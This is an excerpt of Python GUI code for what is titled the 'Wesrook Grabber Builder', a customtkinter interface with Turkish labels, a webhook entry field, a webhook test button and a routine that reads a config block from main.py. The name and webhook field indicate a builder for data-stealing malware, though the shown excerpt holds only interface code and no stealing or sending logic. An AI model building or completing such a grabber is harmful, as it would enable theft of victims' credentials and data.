...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("Wesrook Grabber Builder")
        ...
        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Wesrook Grabber Builder\nMade by Eros and Vasillax.", image=self.logo_image,
        ...
        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
            size=15, family=self.font), placeholder_text="Webhookunuzu giriniz")
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Webhook Testi",
        ...
        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Seçenekler", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
    ...
    def get_config(self):
        with open(self.basefilepath + "\\main.py", 'r', encoding="utf-8") as f:
            code = f.read()
        ...
        if config_match:
            ...
            raise Exception("Could not find config in main.py")
